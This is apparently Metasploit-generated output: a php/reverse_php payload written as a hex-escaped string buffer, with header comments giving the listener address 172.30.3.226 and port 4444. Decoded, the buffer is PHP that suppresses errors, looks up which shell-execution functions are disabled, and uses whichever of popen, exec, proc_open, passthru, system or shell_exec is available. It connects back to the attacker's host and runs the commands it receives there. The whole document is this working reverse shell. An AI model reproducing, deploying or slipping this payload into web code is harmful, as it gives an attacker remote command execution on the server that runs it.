# php/reverse_php - 3015 bytes
# https://metasploit.com/
# VERBOSE=false, LHOST=172.30.3.226, LPORT=4444,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5, CreateSession=true,
# AutoVerifySession=true
buf =
"\x20\x20\x20\x20\x2f\x2a\x3c\x3f\x70\x68\x70\x20\x2f\x2a" +
"\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x40\x65\x72\x72\x6f" +
"\x72\x5f\x72\x65\x70\x6f\x72\x74\x69\x6e\x67\x28\x30\x29" +
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x40\x73\x65\x74\x5f\x74" +
"\x69\x6d\x65\x5f\x6c\x69\x6d\x69\x74\x28\x30\x29\x3b\x20" +
"\x40\x69\x67\x6e\x6f\x72\x65\x5f\x75\x73\x65\x72\x5f\x61" +
"\x62\x6f\x72\x74\x28\x31\x29\x3b\x20\x40\x69\x6e\x69\x5f" +
"\x73\x65\x74\x28\x27\x6d\x61\x78\x5f\x65\x78\x65\x63\x75" +
"\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65\x27\x2c\x30\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x24\x64\x69\x73\x3d\x40\x69" +
"\x6e\x69\x5f\x67\x65\x74\x28\x27\x64\x69\x73\x61\x62\x6c" +
"\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x27\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x69\x66\x28\x21\x65\x6d\x70" +
"\x74\x79\x28\x24\x64\x69\x73\x29\x29\x7b\x0a\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x24\x64\x69\x73\x3d\x70\x72\x65\x67" +
"\x5f\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x2f\x5b\x2c\x20" +
"\x5d\x2b\x2f\x27\x2c\x20\x27\x2c\x27\x2c\x20\x24\x64\x69" +
"\x73\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24\x64" +
"\x69\x73\x3d\x65\x78\x70\x6c\x6f\x64\x65\x28\x27\x2c\x27" +
"\x2c\x20\x24\x64\x69\x73\x29\x3b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x24\x64\x69\x73\x3d\x61\x72\x72\x61\x79\x5f" +
"\x6d\x61\x70\x28\x27\x74\x72\x69\x6d\x27\x2c\x20\x24\x64" +
"\x69\x73\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x65\x6c" +
"\x73\x65\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24\x64" +
"\x69\x73\x3d\x61\x72\x72\x61\x79\x28\x29\x3b\x0a\x20\x20" +
"\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x0a\x20" +
"\x20\x20\x20\x24\x69\x70\x61\x64\x64\x72\x3d\x27\x31\x37" +
"\x32\x2e\x33\x30\x2e\x33\x2e\x32\x32\x36\x27\x3b\x0a\x20" +
"\x20\x20\x20\x24\x70\x6f\x72\x74\x3d\x34\x34\x34\x34\x3b" +
"\x0a\x0a\x20\x20\x20\x20\x69\x66\x28\x21\x66\x75\x6e\x63" +
"\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73\x28\x27\x55" +
"\x44\x67\x45\x4a\x42\x27\x29\x29\x7b\x0a\x20\x20\x20\x20" +
"\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x55\x44\x67" +
"\x45\x4a\x42\x28\x24\x63\x29\x7b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x67\x6c\x6f\x62\x61\x6c\x20\x24\x64\x69\x73" +
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20" +
"\x20\x20\x20\x69\x66\x20\x28\x46\x41\x4c\x53\x45\x20\x21" +
"\x3d\x3d\x20\x73\x74\x72\x70\x6f\x73\x28\x73\x74\x72\x74" +
"\x6f\x6c\x6f\x77\x65\x72\x28\x50\x48\x50\x5f\x4f\x53\x29" +
"\x2c\x20\x27\x77\x69\x6e\x27\x20\x29\x29\x20\x7b\x0a\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x24\x63\x3d\x24\x63\x2e\x22" +
"\x20\x32\x3e\x26\x31\x5c\x6e\x22\x3b\x0a\x20\x20\x20\x20" +
"\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x24\x4a\x49\x47" +
"\x58\x68\x75\x45\x3d\x27\x69\x73\x5f\x63\x61\x6c\x6c\x61" +
"\x62\x6c\x65\x27\x3b\x0a\x20\x20\x20\x20\x20\x20\x24\x53" +
"\x51\x52\x47\x3d\x27\x69\x6e\x5f\x61\x72\x72\x61\x79\x27" +
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20" +
"\x20\x69\x66\x28\x24\x4a\x49\x47\x58\x68\x75\x45\x28\x27" +
"\x70\x6f\x70\x65\x6e\x27\x29\x61\x6e\x64\x21\x24\x53\x51" +
"\x52\x47\x28\x27\x70\x6f\x70\x65\x6e\x27\x2c\x24\x64\x69" +
"\x73\x29\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24" +
"\x66\x70\x3d\x70\x6f\x70\x65\x6e\x28\x24\x63\x2c\x27\x72" +
"\x27\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24\x6f" +
"\x3d\x4e\x55\x4c\x4c\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x69\x66\x28\x69\x73\x5f\x72\x65\x73\x6f\x75\x72\x63" +
"\x65\x28\x24\x66\x70\x29\x29\x7b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x77\x68\x69\x6c\x65\x28\x21\x66\x65" +
"\x6f\x66\x28\x24\x66\x70\x29\x29\x7b\x0a\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x20\x24\x6f\x2e\x3d\x66\x72" +
"\x65\x61\x64\x28\x24\x66\x70\x2c\x31\x30\x32\x34\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x40\x70\x63\x6c\x6f\x73\x65\x28\x24\x66\x70" +
"\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x65\x6c\x73\x65" +
"\x0a\x20\x20\x20\x20\x20\x20\x69\x66\x28\x24\x4a\x49\x47" +
"\x58\x68\x75\x45\x28\x27\x65\x78\x65\x63\x27\x29\x61\x6e" +
"\x64\x21\x24\x53\x51\x52\x47\x28\x27\x65\x78\x65\x63\x27" +
"\x2c\x24\x64\x69\x73\x29\x29\x7b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x24\x6f\x3d\x61\x72\x72\x61\x79\x28\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x65\x78\x65\x63\x28" +
"\x24\x63\x2c\x24\x6f\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x24\x6f\x3d\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28" +
"\x31\x30\x29\x2c\x24\x6f\x29\x2e\x63\x68\x72\x28\x31\x30" +
"\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x65\x6c\x73\x65" +
"\x0a\x20\x20\x20\x20\x20\x20\x69\x66\x28\x24\x4a\x49\x47" +
"\x58\x68\x75\x45\x28\x27\x70\x72\x6f\x63\x5f\x6f\x70\x65" +
"\x6e\x27\x29\x61\x6e\x64\x21\x24\x53\x51\x52\x47\x28\x27" +
"\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e\x27\x2c\x24\x64\x69" +
"\x73\x29\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24" +
"\x68\x61\x6e\x64\x6c\x65\x3d\x70\x72\x6f\x63\x5f\x6f\x70" +
"\x65\x6e\x28\x24\x63\x2c\x61\x72\x72\x61\x79\x28\x61\x72" +
"\x72\x61\x79\x28\x27\x70\x69\x70\x65\x27\x2c\x27\x72\x27" +
"\x29\x2c\x61\x72\x72\x61\x79\x28\x27\x70\x69\x70\x65\x27" +
"\x2c\x27\x77\x27\x29\x2c\x61\x72\x72\x61\x79\x28\x27\x70" +
"\x69\x70\x65\x27\x2c\x27\x77\x27\x29\x29\x2c\x24\x70\x69" +
"\x70\x65\x73\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x24\x6f\x3d\x4e\x55\x4c\x4c\x3b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x77\x68\x69\x6c\x65\x28\x21\x66\x65\x6f\x66" +
"\x28\x24\x70\x69\x70\x65\x73\x5b\x31\x5d\x29\x29\x7b\x0a" +
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x24\x6f\x2e\x3d" +
"\x66\x72\x65\x61\x64\x28\x24\x70\x69\x70\x65\x73\x5b\x31" +
"\x5d\x2c\x31\x30\x32\x34\x29\x3b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x40" +
"\x70\x72\x6f\x63\x5f\x63\x6c\x6f\x73\x65\x28\x24\x68\x61" +
"\x6e\x64\x6c\x65\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d" +
"\x65\x6c\x73\x65\x0a\x20\x20\x20\x20\x20\x20\x69\x66\x28" +
"\x24\x4a\x49\x47\x58\x68\x75\x45\x28\x27\x70\x61\x73\x73" +
"\x74\x68\x72\x75\x27\x29\x61\x6e\x64\x21\x24\x53\x51\x52" +
"\x47\x28\x27\x70\x61\x73\x73\x74\x68\x72\x75\x27\x2c\x24" +
"\x64\x69\x73\x29\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x6f\x62\x5f\x73\x74\x61\x72\x74\x28\x29\x3b\x0a\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x70\x61\x73\x73\x74\x68\x72" +
"\x75\x28\x24\x63\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x24\x6f\x3d\x6f\x62\x5f\x67\x65\x74\x5f\x63\x6f\x6e" +
"\x74\x65\x6e\x74\x73\x28\x29\x3b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x6f\x62\x5f\x65\x6e\x64\x5f\x63\x6c\x65\x61" +
"\x6e\x28\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x65\x6c" +
"\x73\x65\x0a\x20\x20\x20\x20\x20\x20\x69\x66\x28\x24\x4a" +
"\x49\x47\x58\x68\x75\x45\x28\x27\x73\x79\x73\x74\x65\x6d" +
"\x27\x29\x61\x6e\x64\x21\x24\x53\x51\x52\x47\x28\x27\x73" +
"\x79\x73\x74\x65\x6d\x27\x2c\x24\x64\x69\x73\x29\x29\x7b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6f\x62\x5f\x73\x74" +
"\x61\x72\x74\x28\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x63\x29\x3b\x0a\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x24\x6f\x3d\x6f\x62\x5f\x67" +
"\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6f\x62\x5f\x65\x6e" +
"\x64\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0a\x20\x20\x20" +
"\x20\x20\x20\x7d\x65\x6c\x73\x65\x0a\x20\x20\x20\x20\x20" +
"\x20\x69\x66\x28\x24\x4a\x49\x47\x58\x68\x75\x45\x28\x27" +
"\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63\x27\x29\x61\x6e" +
"\x64\x21\x24\x53\x51\x52\x47\x28\x27\x73\x68\x65\x6c\x6c" +
"\x5f\x65\x78\x65\x63\x27\x2c\x24\x64\x69\x73\x29\x29\x7b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x24\x6f\x3d\x73\x68" +
"\x65\x6c\x6c\x5f\x65\x78\x65\x63\x28\x24\x63\x29\x3b\x0a" +
"\x20\x20\x20\x20\x20\x20\x7d\x65\x6c\x73\x65\x0a\x20\x20" +
"\x20\x20\x20\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x24\x6f\x3d\x30\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x0a" +
"\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72" +
"\x65\x74\x75\x72\x6e\x20\x24\x6f\x3b\x0a\x20\x20\x20\x20" +
"\x20\x20\x7d\x0a\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20" +
"\x24\x6e\x6f\x66\x75\x6e\x63\x73\x3d\x27\x6e\x6f\x20\x65" +
"\x78\x65\x63\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x27" +
"\x3b\x0a\x20\x20\x20\x20\x69\x66\x28\x69\x73\x5f\x63\x61" +
"\x6c\x6c\x61\x62\x6c\x65\x28\x27\x66\x73\x6f\x63\x6b\x6f" +
"\x70\x65\x6e\x27\x29\x61\x6e\x64\x21\x69\x6e\x5f\x61\x72" +
"\x72\x61\x79\x28\x27\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e" +
"\x27\x2c\x24\x64\x69\x73\x29\x29\x7b\x0a\x20\x20\x20\x20" +
"\x20\x20\x24\x73\x3d\x40\x66\x73\x6f\x63\x6b\x6f\x70\x65" +
"\x6e\x28\x22\x74\x63\x70\x3a\x2f\x2f\x31\x37\x32\x2e\x33" +
"\x30\x2e\x33\x2e\x32\x32\x36\x22\x2c\x24\x70\x6f\x72\x74" +
"\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x77\x68\x69\x6c\x65" +
"\x28\x24\x63\x3d\x66\x72\x65\x61\x64\x28\x24\x73\x2c\x32" +
"\x30\x34\x38\x29\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x24\x6f\x75\x74\x20\x3d\x20\x27\x27\x3b\x0a\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x69\x66\x28\x73\x75\x62\x73\x74" +
"\x72\x28\x24\x63\x2c\x30\x2c\x33\x29\x20\x3d\x3d\x20\x27" +
"\x63\x64\x20\x27\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x63\x68\x64\x69\x72\x28\x73\x75\x62\x73\x74" +
"\x72\x28\x24\x63\x2c\x33\x2c\x2d\x31\x29\x29\x3b\x0a\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x7d\x20\x65\x6c\x73\x65\x20" +
"\x69\x66\x20\x28\x73\x75\x62\x73\x74\x72\x28\x24\x63\x2c" +
"\x30\x2c\x34\x29\x20\x3d\x3d\x20\x27\x71\x75\x69\x74\x27" +
"\x20\x7c\x7c\x20\x73\x75\x62\x73\x74\x72\x28\x24\x63\x2c" +
"\x30\x2c\x34\x29\x20\x3d\x3d\x20\x27\x65\x78\x69\x74\x27" +
"\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x62\x72\x65\x61\x6b\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x7d\x65\x6c\x73\x65\x7b\x0a\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x24\x6f\x75\x74\x3d\x55\x44\x67\x45\x4a" +
"\x42\x28\x73\x75\x62\x73\x74\x72\x28\x24\x63\x2c\x30\x2c" +
"\x2d\x31\x29\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x69\x66\x28\x24\x6f\x75\x74\x3d\x3d\x3d\x66\x61" +
"\x6c\x73\x65\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x66\x77\x72\x69\x74\x65\x28\x24\x73\x2c" +
"\x24\x6e\x6f\x66\x75\x6e\x63\x73\x29\x3b\x0a\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x62\x72\x65\x61\x6b" +
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a" +
"\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x66\x77\x72\x69\x74\x65\x28\x24\x73\x2c" +
"\x24\x6f\x75\x74\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d" +
"\x0a\x20\x20\x20\x20\x20\x20\x66\x63\x6c\x6f\x73\x65\x28" +
"\x24\x73\x29\x3b\x0a\x20\x20\x20\x20\x7d\x65\x6c\x73\x65" +
"\x7b\x0a\x20\x20\x20\x20\x20\x20\x24\x73\x3d\x40\x73\x6f" +
"\x63\x6b\x65\x74\x5f\x63\x72\x65\x61\x74\x65\x28\x41\x46" +
"\x5f\x49\x4e\x45\x54\x2c\x53\x4f\x43\x4b\x5f\x53\x54\x52" +
"\x45\x41\x4d\x2c\x53\x4f\x4c\x5f\x54\x43\x50\x29\x3b\x0a" +
"\x20\x20\x20\x20\x20\x20\x40\x73\x6f\x63\x6b\x65\x74\x5f" +
"\x63\x6f\x6e\x6e\x65\x63\x74\x28\x24\x73\x2c\x24\x69\x70" +
"\x61\x64\x64\x72\x2c\x24\x70\x6f\x72\x74\x29\x3b\x0a\x20" +
"\x20\x20\x20\x20\x20\x40\x73\x6f\x63\x6b\x65\x74\x5f\x77" +
"\x72\x69\x74\x65\x28\x24\x73\x2c\x22\x73\x6f\x63\x6b\x65" +
"\x74\x5f\x63\x72\x65\x61\x74\x65\x22\x29\x3b\x0a\x20\x20" +
"\x20\x20\x20\x20\x77\x68\x69\x6c\x65\x28\x24\x63\x3d\x40" +
"\x73\x6f\x63\x6b\x65\x74\x5f\x72\x65\x61\x64\x28\x24\x73" +
"\x2c\x32\x30\x34\x38\x29\x29\x7b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x24\x6f\x75\x74\x20\x3d\x20\x27\x27\x3b\x0a" +
"\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x28\x73\x75\x62" +
"\x73\x74\x72\x28\x24\x63\x2c\x30\x2c\x33\x29\x20\x3d\x3d" +
"\x20\x27\x63\x64\x20\x27\x29\x7b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x63\x68\x64\x69\x72\x28\x73\x75\x62" +
"\x73\x74\x72\x28\x24\x63\x2c\x33\x2c\x2d\x31\x29\x29\x3b" +
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x20\x65\x6c\x73" +
"\x65\x20\x69\x66\x20\x28\x73\x75\x62\x73\x74\x72\x28\x24" +
"\x63\x2c\x30\x2c\x34\x29\x20\x3d\x3d\x20\x27\x71\x75\x69" +
"\x74\x27\x20\x7c\x7c\x20\x73\x75\x62\x73\x74\x72\x28\x24" +
"\x63\x2c\x30\x2c\x34\x29\x20\x3d\x3d\x20\x27\x65\x78\x69" +
"\x74\x27\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x62\x72\x65\x61\x6b\x3b\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x7d\x65\x6c\x73\x65\x7b\x0a\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x24\x6f\x75\x74\x3d\x55\x44\x67" +
"\x45\x4a\x42\x28\x73\x75\x62\x73\x74\x72\x28\x24\x63\x2c" +
"\x30\x2c\x2d\x31\x29\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x69\x66\x28\x24\x6f\x75\x74\x3d\x3d\x3d" +
"\x66\x61\x6c\x73\x65\x29\x7b\x0a\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x40\x73\x6f\x63\x6b\x65\x74\x5f" +
"\x77\x72\x69\x74\x65\x28\x24\x73\x2c\x24\x6e\x6f\x66\x75" +
"\x6e\x63\x73\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x20\x62\x72\x65\x61\x6b\x3b\x0a\x20\x20\x20" +
"\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20" +
"\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x40" +
"\x73\x6f\x63\x6b\x65\x74\x5f\x77\x72\x69\x74\x65\x28\x24" +
"\x73\x2c\x24\x6f\x75\x74\x2c\x73\x74\x72\x6c\x65\x6e\x28" +
"\x24\x6f\x75\x74\x29\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
"\x7d\x0a\x20\x20\x20\x20\x20\x20\x40\x73\x6f\x63\x6b\x65" +
"\x74\x5f\x63\x6c\x6f\x73\x65\x28\x24\x73\x29\x3b\x0a\x20" +
"\x20\x20\x20\x7d\x0a"
